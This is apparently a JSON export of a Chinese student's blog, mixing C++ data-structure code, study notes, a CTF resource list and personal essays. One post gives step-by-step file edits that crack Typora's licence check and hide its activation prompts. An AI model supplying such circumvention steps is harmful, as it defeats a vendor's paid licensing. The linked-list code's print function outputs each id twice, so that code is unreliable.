temp->next;\n    }\n    cout << endl;\n}\n```\n</details>\n\n---\n\n### 附经典解法哈希+双向链表AC代码。\n**优化代码，哈希将查找与删除的时间复杂度优化为O(1)，用空间换时间**。\n<details><summary>点击查看代码 </summary>\n```cpp\n#include <iostream>\n#include <unordered_map>\nusing namespace std;\n\nstruct node {\n    int id;\n    node *prev;\n    node *next;\n};\n\nvoid insert(node *&head, int k_id, int new_id, bool left, unordered_map<int, node*> &nodes) {\n    node *target = nodes[k_id];\n    node *newNode = new node();\n    newNode->id = new_id;\n    newNode->prev = nullptr;\n    newNode->next = nullptr;\n    nodes[new_id] = newNode;\n\n    if (!left) { // 插入到右侧\n        newNode->prev = target;\n        newNode->next = target->next;\n        if (target->next != nullptr) {\n            target->next->prev = newNode;\n        }\n        target->next = newNode;\n    } else { // 插入到左侧\n        newNode->next = target;\n        newNode->prev = target->prev;\n        if (target->prev != nullptr) {\n            target->prev->next = newNode;\n        } else {\n            head = newNode; // 更新头节点\n        }\n        target->prev = newNode;\n    }\n}\n\nvoid deleteNode(node *&head, int id, unordered_map<int, node*> &nodes) {\n    if (nodes.find(id) == nodes.end()) return;\n    node *target = nodes[id];\n\n    // 更新前驱节点\n    if (target->prev != nullptr) {\n        target->prev->next = target->next;\n    } else {\n        head = target->next; // 删除的是头节点\n    }\n\n    // 更新后继节点\n    if (target->next != nullptr) {\n        target->next->prev = target->prev;\n    }\n\n    nodes.erase(id);\n    delete target;\n}\n\nvoid printList(node *head) {\n    node *temp = head;\n    while (temp != nullptr) {\n        cout << temp->id << \" \";\n        cout << temp->id << \" \";\n        temp = temp->next;\n    }\n    cout << endl;\n}\n\nint main() {\n    ios::sync_with_stdio(false);\n    cin.tie(0);\n    cout.tie(0);\n\n    int n, m;\n    cin >> n;\n    node *head = new node();\n    head->id = 1;\n    head->prev = head->next = nullptr;\n    unordered_map<int, node*> nodes;\n    nodes[1] = head;\n\n    for (int i = 1; i < n; ++i) {\n        int k, p;\n        cin >> k >> p;\n        insert(head, k, i + 1, p == 0, nodes);\n    }\n\n    cin >> m;\n    while (m--) {\n        int id;\n        cin >> id;\n        deleteNode(head, id, nodes);\n    }\n\n    printList(head);\n\n    // 释放内存\n    node *current = head;\n    while (current) {\n        node *next = current->next;\n        delete current;\n        current = next;\n    }\n\n    return 0;\n}\n```\n</details>\n\n---","tags":["学习","数据结构","编程"],"categories":["日常学习","数据结构"]},{"title":"Typora激活成功","url":"/2025/02/24/sheng-huo/ji-lu/typora-ji-huo-cheng-gong/","content":"# Typora激活成功\n\n\n记录typora激活，参考教程是[CSDN](https://blog.csdn.net/qjkewdmgkq/article/details/139335063)。\n苦于一些2022教程里面一些大佬的脚本被Ban掉无法git clone，鉴于CSDN实在是过于恶心（复制要开会员）所以把这个在2025年可以完成的激活教程记录一下。\n\n## 找到要修改的js\n之前寻找了很多教程都说Typora的激活是根据一个license的激活是否为true而决定的，所以本地修改那个部分也是完成了后台激活部分。\n>方法：\n>- 进入..\\Typora\\resources\\page-dist\\static\\js\\LicenseIndex.180dd4c7.4da8909c.chunk.js\n>- ctrl+F搜索\"e.hasActivated=\"true\"\"，将e.hasActivated=\"true\"==e.hasActivated改为e.hasActivated=\"true\"==\"true\"。\n>- 后台激活成功。\n\n\n## 关闭启动激活弹窗\n\n> 方法：\n>\n> - 进入..\\Typora\\resources\\page-dist\\license.html\n>\n> - 定位到最后的\n>\n>   ```</body></html>```\n>\n> - 将其改为\n>\n>   ```</body><script>window.onload=function(){setTimeout(()=>{window.close();},50000000);}</script></html>```\n\n注意这里的5000000，小一点的数字不行，有data error的问题。\n\n## 去除左下角\"未激活\"提示\n\n> 方法：\n>\n> - 进入..\\Typora\\resources\\locales\\zh-Hans.lproj\\Panel.json\n> - ctrl+F搜索\"UNREGISTERED\":\"未激活\"，将其改为\"UNREGISTERED\":\"\"（把未激活三个字删掉即可）。\n\n## 重新打开Typora\n\n启动手动关掉激活窗口，之后不再出现。\n![激活界面](/images/Typora激活成功/typora激活.png)\n\n## 总结\n我平时用Obsidian写markdown，综合性比Typora高一些，还不收费，不弹出来让你激活的提示，因为文件管理什么的也很方便，还有挺多第三方插件的。\n那为什么要花那么多时间去找Typora激活？\n也许是因为Typora界面挺好看的。😹","tags":["学习","破解"],"categories":["日常学习"]},{"title":"书写真值表注意事项","url":"/2025/02/23/xue-xi/shu-xue/shu-xie-zhen-zhi-biao-zhu-yi-shi-xiang/","content":"# 书写真值表注意事项\n\nG老师给的\n\n---\n\n### **1. 书写真值表的格式**\n\n一般来说，真值表的格式是 **表格状**，每一列对应一个变量或计算结果，每一行代表一种可能情况：\n\n```\n| A | B | 计算结果 |\n|:-:|:-:|:-:|\n| 0 | 0 | ? |\n| 0 | 1 | ? |\n| 1 | 0 | ? |\n| 1 | 1 | ? |\n```\n\n但手写作业时，可能不是每个人都习惯画表格，你可以：\n\n- **规范画表格**（最好用直尺，让表格对齐，看起来清晰）。\n- **如果不画表格，也要对齐数据**，不要写得歪歪扭扭，影响计算。\n\n---\n\n### **2. 书写顺序**\n\n1. **先列出输入变量（A、B、C...）**，排列方式按**二进制顺序**：\n    \n    - 两个变量 → 00、01、10、11\n    - 三个变量 → 000、001、010、011、100、101、110、111\n    - 以此类推，行数是 。\n2. **如果是复杂表达式，分步计算，每个中间结果开一栏**。\n    \n    - **例如计算** ：\n        \n        ```\n        | A | B | C | A ∧ B | ¬C | (A ∧ B) ∨ ¬C |\n        |:-:|:-:|:-:|:-:|:-:|:-:|\n        | 0 | 0 | 0 |  0  |  1  |       1       |\n        | 0 | 0 | 1 |  0  |  0  |       0       |\n        | 0 | 1 | 0 |  0  |  1  |       1       |\n        ```\n        \n    - **不要直接跳到最终结果**，这样容易出错。\n3. **计算时注意逻辑运算的优先级**：\n    \n    - **先计算括号内的内容**。\n    - **非（¬）的优先级最高**。\n    - **与（∧）高于或（∨）**。\n    - **蕴含（→）可以拆解成 \"¬A ∨ B\"** 计算。\n\n---\n\n### **3. 数字 & 符号书写规范**\n\n手写作业时：\n\n- **0 和 1 要清晰，别写成 o 或 l**（尤其是用草稿本时）。\n- **运算符号写清楚**，比如：\n    - “∧” （与）不要写成普通的“^”。\n    - “∨” （或）不要写成 “V”。\n    - “¬” （非）可以直接写成 \"¬\" 或 \"~\"（看老师习惯）。\n- **表达式复杂时，括号一定要写全**，否则可能影响计算顺序。\n\n---\n\n### **4. 行数一定要对齐**\n\n- 书写时，**每一行都要整齐**，别让某些数据偏左、某些偏右，容易导致计算错误。\n- 如果是表格形式，最好用**直尺**画线，这样作业看起来整洁，批改也方便。\n\n---\n\n### **5. 避免常见错误**\n\n- **变量排列顺序错了**  \n    ❌ **错误例子：**\n    \n    ```\n    | A | B |\n    |:-:|:-:|\n    | 0 | 1 |\n    | 1 | 0 |\n    | 0 | 0 |\n    | 1 | 1 |\n    ```\n    \n    ✅ **正确方式（按照二进制递增）：**\n    \n    ```\n    | A | B |\n    |:-:|:-:|\n    | 0 | 0 |\n    | 0 | 1 |\n    | 1 | 0 |\n    | 1 | 1 |\n    ```\n    \n- **直接写最终结果，而不写中间步骤**\n    \n    - 这样老师可能会扣步骤分，建议**先写中间逻辑运算，再写最终答案**。\n- **计算 “蕴含（→）” 时搞错规则**\n    \n    - 记住 只有在 **A=1, B=0 时为 0**，其他情况都是 1。\n\n---\n\n### **总结**\n\n✔ **画表格/对齐数据，让作业清晰**。  \n✔ **按二进制顺序列变量**，别乱排列。  \n✔ **复杂表达式分步计算，每个运算单独一列**。  \n✔ **符号写清楚，运算优先级正确**。  \n✔ **用直尺画线（如果老师要求规范整齐）**。\n","tags":["学习","数学","注意事项"],"categories":["日常学习","离散数学"]},{"title":"数据结构课程注意事项","url":"/2025/02/18/xue-xi/shu-ju-jie-gou/shu-ju-jie-gou-ke-cheng-zhu-yi-shi-xiang/","content":"# 数据结构课程注意事项\n\n## 课程考核总览\n![](/images/数据结构课程注意事项/总览.jpg)\n\n## **小组作业：**\n· 个人小主题\n· 双匿名评分\n· ppt转pdf\n· 评分量表\n\n## **小班讨论**：\n![讨论](/images/数据结构课程注意事项/讨论.jpg)\n\n\n### **个人资料**\n需要表达清楚，涉及算法用人能看懂的东西来写，像论文一样写。\n文字越多看的懂的人越少，善用图表，语言简练清晰。\n![](/images/数据结构课程注意事项/个人资料.jpg)\n\n### 小组报告：\n讨论课需要录音嵌入。\n![](/images/数据结构课程注意事项/小组报告.jpg)\n\n## **线上学习：**\n· 刷够时长500分钟\n· 有线上测试，拍照上传\n\n## **实验：**\n![](/images/数据结构课程注意事项/实验.jpg)\n\n**在超星平台上提交**。\n\n","tags":["学习","注意事项","数据结构"],"categories":["日常学习","数据结构"]},{"title":"忏悔录？","url":"/2025/02/09/sheng-huo/za-tan/chan-hui-lu/","content":"最近很喜欢GD。\n{% aplayer \"니가 뭔데 (Who You?)\" \"G-Dragon\" \"/music/Who You.mp3\" \"/images/COUP D'ETAT.jpg\" %}\n---\n\n小时候，父母问过我一个问题：“你是利己主义者，还是利他主义者？”\n\n我知道这两个词的意思，一个是自私，一个是无私。但当时的我答不上来。课本里说，自私是坏的，我们应该无私奉献，成为一个好人。我也曾努力去做。我想过捐款，做到拾金不昧，把旧衣服送给贫困的孩子。可我发现，周围的人似乎并不是这样。\n\n班长觉得我的玻璃星星很好看，便以“借去玩玩”为由拿走了这颗我表姐送给我的星星，几年过去也没还，似乎早已忘记这回事。但我一直记着。\n老师不给我发三好学生奖状，因为她认定我是一年级就伤害同学的“坏孩子”。即使我后来考了全班第二，和第一名同分，她仍然不肯给我那张奖状。可我记得那次“伤害”，不过是因为一个同学不断问我重复的问题，我一遍遍回答，他却像听不懂一样，我气急之下用塑料管戳了他，没控制好力道，不小心戳到了他的眼睛。\n\n奶奶责备我，为什么这个学期只拿了“优秀少先队员”，而不是三好学生。可是，我一年级就被选为少先队员，这本是一个优秀的证明。然而，看着那张被她揉成纸团的奖状，我开始思考——我明明很好，可为什么我不是呢？\n\n世界并不无私，而我也学会了自私。\n\n我向朋友倾诉秘密，决裂后，她在人最多的地方大喊我是个“没妈的孩子”。\n大家找我玩，却总让我当“坏人”，因为我长得高大冷淡，适合做被“好人”抓捕的反派。\n和朋友玩猜拳，输了要被打一巴掌。我被打了很多下，他们笑得很开心。\n\n小时候，我不懂，长大了，我懂了一些。\n我学会了编织谎言，让他们开心。\n我学会了提前预测他们的反应，决定要不要告诉他们事情。\n我学会了撒谎，让同学相信我有个双胞胎姐姐——那其实只是户口本上多余的一个登记名。\n我学会了捏造故事，说自己捡到一百元拾金不昧，想得到夸奖，却换来一声“你真傻”的讥笑。\n我学会了骗网友，说自己跳级了，和他现在是同一个年级。\n\n我当了很多年的骗子，为了塑造一个更“完美”的自己。\n自私，是个坏词，而我就是这样的人。\n\n\n---\n\n可是，现在的我累了。\n\n谎言说出口很简单，维护却很累。\n这种疲惫让我选择了说实话。\n于是，我成了最诚实的人，因为我只说实话。\n现在的人不知道，我曾是个满口谎言的自私鬼。\n\n但内核并没有变。\n利己主义只是被包裹起来，成为我成长的横向根基。\n我变得沉默，对周围的一切多了些不信任。\n或许只是因为，我觉得大家本就是自私的吧。\n多说无益，沉默是金。\n\n自私，是教材里的坏词。无私，是我们该推崇的美德。\n但我没有那么伟大。\n当我发现大家都是这样想的时候，反而感到安心。\n既然所有人都是坏人，那我也当个坏人，当个最黑暗的坏人，这样也挺酷的。\n\n\n---\n\n都说童年决定了一个人的一生。\n我清醒地度过了我的童年。\n\n我一直想做与众不同的那一个，但我知道，这个世界上有很多人和我一样。\n所以我尽量避免喜欢热门的东西，避免成为大多数。\n\n可是谁会看看我呢？\n爸爸妈妈把目光放在弟弟身上，姑妈关注着表妹，奶奶关心爸爸和姑妈。\n我太自私了，我想要独属于我的爱。\n\n可我的爱，像是拼凑起来的。\n他们在爱别人的时候，顺便拿一点分给我。\n但我想要的是一颗完整的、只属于我的爱啊……\n\n我知道你会说“很多人都爱你”。\n可我就是这么恶劣。\n我想要一颗完整的，独一无二的。\n毕竟，我从来都不喜欢别人剩下的东西。\n毕竟，我一直是自私的孩子，利己主义至上的人。\n","tags":["生活","杂谈"],"categories":["杂谈"]},{"title":"家","url":"/2025/02/09/sheng-huo/ji-lu/jia/","content":"# 家\n\n## 回家\n**奶奶得去看病，明天我要陪她去爸妈家。**  \n\n奶奶脖颈痛很久了，耳朵也痛，声带又渐渐嘶哑起来，一点音都没有了。很不乐观。奶奶笑着说自己要变成聋哑人了，我不肯，拉着她去看病，姑妈说先去长沙看看。\n父亲失业后有了空闲，正好可以开车带奶奶去长沙湘雅。但这意味着，我要先在爸妈家住一晚，第二天让父亲开车去湘雅。看完病后，还要回去几天，给外婆外公们拜年啊这类。  \n\n不过我不太想回去。我对父母没有很亲的关系，再加上之前发生的种种不快，我怕在那里多呆几天又滋生我对父母的厌恶感。\n想少待一天是一天，忙完快点回校吧，也快开学了。\n\n---\n**突然很想吐露一下自己的不快。浅浅抱怨一下吧。**\n## 生日\n**我想起去年的生日。**  \n**提前预告，满怀期待，专程回家，结果得到的却是——**  \n> “你生日不代表今天你优先。”  \n\n**无人在意，无人在乎。**  \n我自己掏钱买了生日蛋糕，一个人躺在没有铺床的“我的房间”里，被寒冷包裹，一个人打车去高铁站回学校。\n\n我不想去。  \n那里，不是家。  \n\n我理解成年人忙碌，我理解生活的现实。  \n但我也想，哪怕一次，成为一个可以**随意撒娇的孩子**。  \n我也想，在生日这一天，自己可以被优先考虑。  \n我知道，生日并不是重要的东西，我理解一切，但那天，我想做个孩子。  \n\n**我想收到他们的礼物，一起吃蛋糕，唱生日歌，戴生日帽，吹蜡烛，许愿。**  \n那一刻，哪怕是假象，也让我有希望，哪怕是短暂的梦，也让我相信愿望会实现。  \n**毕竟，他们曾经说过，生日这天，我优先。**  \n\n但实际的情景是，所有人都不在意。  \n**那我回去，又有什么意义呢？**  \n我早已习惯独立，冷漠，孤独，疲惫。  \n我理解成年人的利益交换，也知道公理不是靠嘴说就能实现的。  \n**但就生日这一天，我想任性。**  \n\n---\n\n## 高三\n**我想起高三的时候。**  \n我每天都被压力压得喘不过气，看着数学物理的试卷毫无起色，化学生物成绩不尽人意，语文英语停滞不前，**与梦校之间的距离，越来越远。**  \n\n我依旧撑着自己。  \n\n我跟奶奶说，**每天骑单车回家太累，能不能租个房子？**  \n又担心一个人住会错过上课时间，不想带电子产品干扰学习，**于是让奶奶来陪我，给我做饭，叫我起床。**  \n\n可是在学校里，看着别人的父母给他们送饭，带他们出去吃好吃的，打电话嘘寒问暖……  \n我心里总是有些悲伤。  \n\n> **爸爸妈妈什么时候会给我打电话？**  \n> **爸爸妈妈会不会给我发零花钱，让我多吃点好的？**  \n> **爸爸妈妈会不会抽空开车来看我，给我一个惊喜？**  \n\n答案是——**没有。**  \n\n甚至，后来我才知道，他们一直在研究，我到底能不能考上本科。  \n**一本的学校？他们甚至怀疑我是否考得上。**  \n\n我只觉得**荒谬，又悲哀。**  \n我在笑自己，**为什么要把感情托付给两个从未主动了解过我的人？**  \n\n他们甚至不知道我喜欢吃什么，穿什么，用什么，连我的成绩都不了解，连我的兴趣爱好都一无所知。  \n**那这，所谓父母和陌生人有什么区别...**  \n\n我一直安慰自己，**他们工作忙，他们要养家，他们要照顾弟弟。**  \n可是，现在我上了大学，**我还是在安慰自己。**  \n他们从没给我发过生活费，零花钱都没有，甚至没问过我缺什么，有没有受委屈。  \n他们还拿走了我的升学红包，甚至**还在觊觎我的比赛奖金，说是“补贴家用”。**  \n\n---\n\n## 理解\n**奶奶总是让我理解父母。**  \n我爱奶奶，我听奶奶的话。  \n但这一点，**我很难听下去。**  \n\n奶奶说，**以后有困难，找爸妈。**  \n可我宁愿去找姑妈，也不想找他们。  \n\n**我小时候就对去父母家有抵触感了。**  \n回爷爷奶奶家，我很开心，因为那里是家。  \n去姑妈家，我也很开心，因为姑妈家很好很好。  \n但去爸妈家……我知道自己“应该”去，可心里总是有种说不出的抵触感。  \n\n奶奶总是想去父母家，说是想**照顾弟弟，看看爸爸**。  \n可我知道，**弟弟对奶奶很生疏，他只是把奶奶当作一个能让他玩手机的“提手机机器”而已。**  \n奶奶在意的爸爸，也没怎么真正关心过她，没有主动给奶奶打过电话，回家也只是自顾自的打魔兽，不和奶奶说说话。  \n**那为什么她总是要去“照顾”他们？**  \n\n或许是我太在乎奶奶。\n不过我不喜欢待在那里。**从那一刻的失望起，我确定了而已。**  \n\n---\n\n## 我不想回家...\n**我其实想一直不去。**  \n\n我宁愿假期去姑妈家、爷爷奶奶家，**都不想待在父母家。**  \n\n那里离学校最近，坐高铁只要**10分钟**，但却是离我最远的地方。  \n\n奶奶总是问我什么时候去父母家，我很想告诉她——  \n\n> **我不想回那里，一刻都不想停留。**  \n>\n> **假期结束前，我只想直接回学校。**  \n\n只是，我不想再睡在那个**没有收拾的床，发黄的枕头，冰冷的薄被子，乱放杂物的“我的房间”了。**\n\n---\n## 只是...\n虽然那里很冷。\n**但是毕竟那一直是家。虽然冷，但那毕竟是一个住的地方**。\n\n## 后日谈\n\n### 确诊\n奶奶最终被确诊为早期喉癌，在湘雅诊断后转去南华住院了，在那里有我姑母照顾也比在长沙住院好一些。\n\n![结果](/images/home/结果.jpg)\n父亲也开车，当周转司机，当一个尽职尽责的儿子。这几天一直在株洲和长沙周转，每天早上就开车，还给奶奶送饭送菜，陪奶奶做完检查后又晚上开车回去。\n我就做呆在长沙的陪护，父亲去忙检查的事情的时候，我就陪着奶奶，给奶奶做个翻译。之前是奶奶说话声音太小做扩声器，现在就是看手语和比划做转译器。父亲说有我在奶奶身边他会安心很多，这也是罕见的**父亲对我说我让他安心的时候。**\n\n我也开始觉得父亲挺辛苦的。我的性格与习性和父亲很相似，虽然没有一起生活超过一个月过吧，但是我还是借着基因遗传了很多他的性格，比如懒惰，拖拉，悲观，利己。哦对了，最重要的还是重视亲情，至少对待亲情方面不会无所谓。\n\n或许是长大了一点吧？...也许吧。之前还是失望太多，导致一点点夸奖都显得弥足珍贵。又或许是父亲也长大了一些，我能理解他，那些事情换我去做，估计我表现的和父亲应该大差不差。有时候我也觉得，**父亲是我长大后的一个幻影。**\n\n### 返校\n诊断结果出来后，和医生聊了治疗方案，鉴于奶奶的特殊情况加二次癌症，在原癌症区域做放化疗还是不可能的，于是说了考虑靶向治疗。\n啊哈，高中生物的时候学的那么多东西，靶向治疗，单克隆抗体，细胞免疫什么的算是终于有了一些实感。\n交流完后打算转院去衡阳了，南华那边给出的治疗方案也是靶向治疗，而且衡阳那边还有姑妈照应着，我和父亲就没有那么累了。\n\n恰好也快开学了，我让父亲把我丢到长沙，过了几天单人寝的日子。\n单人寝是很爽，也很孤独。我倒不是那种没人聊天就特别无聊的E人，只是感觉一个人的寝室就算开了空调也冷得很。我的寝室关系不错，目前我在大学里能说得上话的朋友也就舍友了。\n离开学的日子越近，学校的人也越来越多。或许很快我就会怀念现在的这份孤独了。\n**抱怨到这里。我们新学期见吧**。\n\n","tags":["生活"],"categories":["杂谈"]},{"title":"渗透学习","url":"/2025/02/06/xue-xi/ctf/shen-tou-xue-xi-ji-hua/","content":"\n# 🛡 CTF 学习计划\nGPT给的\n\n## 📌 **第 1 阶段：环境搭建**\n| 任务 | 推荐资源 |\n|------|------|\n| 安装 Kali Linux（VMware/VirtualBox） | [Kali 官方网站](https://www.kali.org/) |\n| 配置 Web 渗透工具（Burp Suite, sqlmap） | [Burp Suite 文档](https://portswigger.net/burp), [sqlmap GitHub](https://github.com/sqlmapproject/sqlmap) |\n| 安装 pwn 调试工具（gdb, pwndbg, ropper） | [pwndbg GitHub](https://github.com/pwndbg/pwndbg), [Ropper 工具](https://github.com/sashs/Ropper) |\n\n---\n\n## 🔥 **第 2 阶段：Web 渗透基础**\n| 任务 | 推荐资源 |\n|------|------|\n| 在 DVWA 练习 SQL 注入，使用 sqlmap | [DVWA 靶场](http://www.dvwa.co.uk/), [sqlmap 教程](https://github.com/sqlmapproject/sqlmap/wiki) |\n| 学习 XSS（反射型、存储型、DOM XSS） | [XSS 平台 xsshunter](https://xsshunter.com/), [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/) |\n| 练习 Webshell 上传绕过 | [Hack The Box Webshell 题目](https://www.hackthebox.com/) |\n| 学习 SSRF（服务器端请求伪造） | [SSRF 实战教程](https://portswigger.net/web-security/ssrf) |\n| 在 HackTheBox 里尝试一个 Web 靶机 | [HackTheBox 入口](https://www.hackthebox.com/) |\n\n---\n\n## 💀 **第 2 阶段：Pwn 漏洞利用**\n| 任务 | 推荐资源 |\n|------|------|\n| 学习基础缓冲区溢出（Buffer Overflow） | [pwnable.kr 官网](http://pwnable.kr/) |\n| 使用 gdb 调试 pwnable.kr 的基础题 | [GDB 使用手册](https://sourceware.org/gdb/) |\n| 学习格式化字符串漏洞（Format String） | [格式化字符串漏洞 CTF 题解](https://ctftime.org/writeups) |\n| 练习 ROP，利用返回地址执行 shell | [ROP Emporium 练习](https://ropemporium.com/) |\n\n---\n\n## 🚀 **第 3 阶段：真实漏洞研究**\n| 任务 | 推荐资源 |\n|------|------|\n| 在 Exploit-DB 找一个 CVE 漏洞复现 | [Exploit-DB](https://www.exploit-db.com/) |\n| 学习 CVE 漏洞利用的 PoC 编写 | [CVE Details](https://www.cvedetails.com/) |\n| 尝试写自己的简单 Exploit | [Python 编写 Exploit 教程](https://www.offensive-security.com/metasploit-unleashed/exploit-development/) |\n| 挑战 HackTheBox 里的真实靶机 | [HackTheBox 挑战列表](https://www.hackthebox.com/) |\n\n---\n\n## 🎯 **学习方法建议**\n- **每个阶段至少完成 3-5 个任务后再进入下一阶段**\n- **遇到问题时，优先查找 Writeup（题解），然后自己尝试**\n- **可以在博客或笔记中记录每个阶段的收获**\n- **如果有不懂的，去 CTFHub / XCTF 社区交流**\n- **最重要的是，动手实操，不只是看理论！**\n\n---","tags":["学习","CTF","计划"],"categories":["CTF学习"]},{"title":"存个利息代码","url":"/2025/01/18/sheng-huo/za-tan/cun-ge-li-xi-dai-ma/","content":"\n# 这只是一个存档，用来存储我的支付宝的小荷包的计划收益\n目前想的是一天1元开始0.03元累加的稳定存储，先这样开始吧，运行代码看看一年后200元/分的收益+每个月200的固定存储+每日存储看看一年后能存多少钱。\n\n啊，如果有什么奖金啊我也会存进去的，看看能不能攒出一个switch2或者其他电子产品什么的...\n或者明年买GTA6的钱？或者下一张GIDLE专辑的钱？\n先一年开始吧，留点钱比什么都有用。\n\n---\n把函数封装了一下，[扔到一个小仓库了](https://github.com/Moyuin-aka/daily_life_code.git)。\n用cmake构建的小项目，以下大概就是新改动吧。\n>main.cpp\n```cpp \n#include <iostream>\n#include \"simulate.h\"\nusing namespace std;\n\nint main()\n{\n    //system(\"chcp 65001\");\n    double initial_input = 1.33;                    // 初始存入金额\n    double total_sum = 3600;                        // 总存款\n    double per_rate = 0.03;                         // 每月递增比例\n    double monthly_expense = 2000 - 150 - 200;      // 每月固定支出（生活费、订阅费等）\n    double daily_food_expense = (5 + 20 + 20) * 30; // 每月餐费支出\n    printf(\"初始存入金额为 %.2f, 每月递增比率为 %.2f\\n\\n\", initial_input, per_rate);\n    simulateYear(initial_input, total_sum, per_rate, monthly_expense, daily_food_expense);\n    return 0;\n}\n```\n>函数库simulate.h\n```cpp\n#include \"simulate.h\"\n#include <iostream>\n#include<cmath>\nusing namespace std;\n\nvoid simulateYear(double initial_input, double total_sum, double per_rate, double monthly_expense, double daily_food_expense)\n{\n    int month = 2;            // 当前月份\n    double monthly_input = 0; // 本月存款\n    double remain = 0;        // 剩余余额\n    double package_interest = 0;\n    double package_monthly_interest = 0;\n\n    // 模拟365天\n    for (int i = 0; i < 365; i++)\n    {\n        simulateDay(total_sum, monthly_input, initial_input, per_rate, package_interest, package_monthly_interest);\n\n        // 每个月结束后，计算剩余余额\n        if (i % 30 == 0 && i != 0)\n        {\n            simulateMonth(total_sum, monthly_input, monthly_expense, daily_food_expense, remain, package_monthly_interest, month);\n            month++;\n            monthly_input = 0; // 重置本月存款\n        }\n    }\n\n    // 打印最终结果\n    printf(\"小荷包带来的收益为： %.2f\\n\", package_interest);\n    printf(\"本年度未存款的可支配的支出为: %.2f\\n\", 2000 * 12 - total_sum);\n    printf(\"每日存入金额最终为: %.2f\\n\", initial_input);\n    printf(\"最终剩余余额为: %.2f\\n\", remain);\n}\n\nvoid simulateDay(double &total_sum, double &monthly_input, double &initial_input, double per_rate, double &package_interest, double &package_monthly_interest)\n{\n    total_sum += initial_input;     // 总存款累计\n    monthly_input += initial_input; // 本月存款累计\n    initial_input += per_rate;      // 增加递增金额\n    // 计算收益：每200元存款产生0.01元收益\n    double current_interest = floor(total_sum / 200) * 0.01; // 满200元的部分计算收益\n    total_sum += current_interest;                           // 收益加到存款里\n    monthly_input += current_interest;\n    package_interest += current_interest;\n    package_monthly_interest += current_interest;\n}\n\nvoid simulateMonth(double &total_sum, double &monthly_input, double monthly_expense, double daily_food_expense, double &remain, double &package_monthly_interest, int month)\n{\n    total_sum += 200;                                                             // 每月存入两百\n    double current_remain = monthly_expense - monthly_input - daily_food_expense; // 当前月剩余金额\n    remain += current_remain;                                                     // 累计剩余余额\n    cout << \"第 \" << month << \" 个月的存入金额为: \" << monthly_input << \" 本月所有存入总额为: \" << monthly_input << endl;\n    printf(\"本月餐费为 %.2f\\n\", monthly_expense - monthly_input);\n    printf(\"剩余余额为 %.2f\\n\", remain);\n    printf(\"本月收益为 %.2f\\n\", package_monthly_interest);\n    printf(\"目前存入总金额为 %.2f\\n\", total_sum + 0.04);\n    cout << endl;\n    package_monthly_interest = 0;\n}\n```","tags":["编程","生活"],"categories":["日常学习","生活代码"]},{"title":"疲惫","url":"/2025/01/13/sheng-huo/ji-lu/pi-bei/","content":"# **大一上期末！！**\n\n## **程序设计喜被卡绩点，但是...** 程序设计\n*88，哈哈，总评 88....*\n\n虽然期末一考完就知道自己错了两个概念类的选择题，就知道自己程序设计这分数完蛋了，但是一看到程序设计88的总评我还是破防了...难过一天。\n但又怎么样呢，我能说什么呢？。。。。\n![成绩分布](/images/tired/c++_design.png)\n才大一，无所谓了...吗？\n\n或许我沿袭着高中的思路，成为了所谓优绩主义裹挟的大学生...\n**没满绩点但又怎样呢**？我一直在这样问自己.....\n我已经来到了大学，按道理来说，成绩应当不成为评价自己的方式啊。...况且已经有人告诉我，88分已经是很高的成绩了...\n我的完美主义总是在这个时候作祟。在评价体系中，当我发现我不是前排，或者不是顶尖那一批，即便我总是呆在那个中上的等级，但我总觉得自己好像，不够好，不够完美啊....\n**我在安慰自己**，我说，我才大一，这点差距完全可以追平，又不是天堑，一切都还有可能。\n**但我又感觉，我其实不需要安慰自己**。我完全可以考完试后，丢掉这一切考试，专心做一些我感兴趣的事情...大学不是高中初中，我不需要再进行一次高考中考了，我没必要因为成绩而难过呀。就算追不平又怎样？保研不行我就考研，考研不想就去走选调考公，考公不感兴趣就直接去找工作赚钱去，只是想说，**我为什么要拘泥于成绩里，我为什么还为没考到好成绩，甚至只是因为没有满绩点而难过啊？**\n\n程序设计我的大作业拿到了最高分（92分的那一项，其实应该是96分，我把我的4分分享给了我的组员），那个东西才是我收获最大的。就这个[自己学着写的图书管理系统，AI写框架，自己填功能修bug](https://github.com/Moyuin-aka/LibrarySystem_HNU_InformationSecurity2024_2401)。这个项目我学到的东西，我学会了git怎么用，自己知道了markdown写报告，我还学了点cmake，甚至我想去尝试一下sql数据库，搞懂了不同环境下的潜在的中文不兼容性，然后自己凭着兴趣创了这个博客...虽然微不足道，但这些东西比起拿着电脑迷迷糊糊去坐在那里上课看着老师讲一大坨东西发呆，然后刷着oj去自学,在实践意义上，有用的多得多了。\n我已经收获到了我要学的东西，我只是在反问自己：**我为什么因为成绩要难过啊？**\n我只是想告诉自己吧，我很优秀。但我应该自己也要知道我已经很优秀了...**不需要靠着满绩**来证明自己优秀...我没必要受着优绩主义的压力下，**没必要也不应该**将大学又过成一个为分数焦虑的高中，编程是我一直想学的东西，兴趣会驱动我继续向前走的。\n\n一切尘埃落定了。\n又不是挂科。又不用重新考。我学完了，我可以去学下一门了。\n专心，下一门吧。心定。\n\n## **期末复习好累！！** 高数\n*哈哈，但是！我考完了！！*\n\n高数好难，我会的东西我还算错了！！我连设微分方程特解都下意识设错了！！积分我还漏项了！！（那个积分好难！！）我第一题求渐近线都忘记怎么求了！！那个破伪装成积分题的物理题我也受够了！！我列出了算式，但我算式好像有点问题呀！！\n\n*虽然考成了依托构式，但是已经考完了！！*\n\n**已经考完了，就代表着一切结束了！对吧！！！！**\n大家都说高数难我就放心了，这一门心平气和吧。\n\n虽然我知道我的数学一直都是这样，**从初中开始我的数学就是一坨**...但感觉大学的高数理解了概念后写东西刷题其实都差不多，甚至因为没有很多思维拓展类的东西反而还更简单点，唯一难点可能就是积分你不知道怎么凑吧...\n\n我也不知道自己是数学分析思维薄弱还是咋，我很难把问题数学化，除非我自己刷过很多题然后顺着题来就着写思路...还好，大学这样写应付期末考试也够了。\n我自己认为我绝对不是数学强的人，就是因为这一点...但不代表我数学弱啊，会写的计算题我还是推的出思路的，这次大家都说难的不定积分和定积分我都求出来了（虽然不定积分漏了一个常数项，被自己无语到了），我不知道这属于什么方面的数学能力....\n不太适合数学实践和做题创新，但当个做题的计算器还是很不错的！\n\n就这样吧，群里大家都在发*老师菜菜捞捞*，我没发，算了算，其实写对的也应该有60分了...也没必要为了分数去求情啥的，没有哪个老师会看到学生59分不捞捞多给点平时分吧？（毕竟学生不及格那麻烦事可太多了...）\n静候。\n\n## **纯自学到期末发现啥也不会怎么办！** 线代\n*没关系，线代速成课救你狗命...[推荐框框老师...](https://www.bilibili.com/video/BV1Ey4y147xn/)*\n\n### 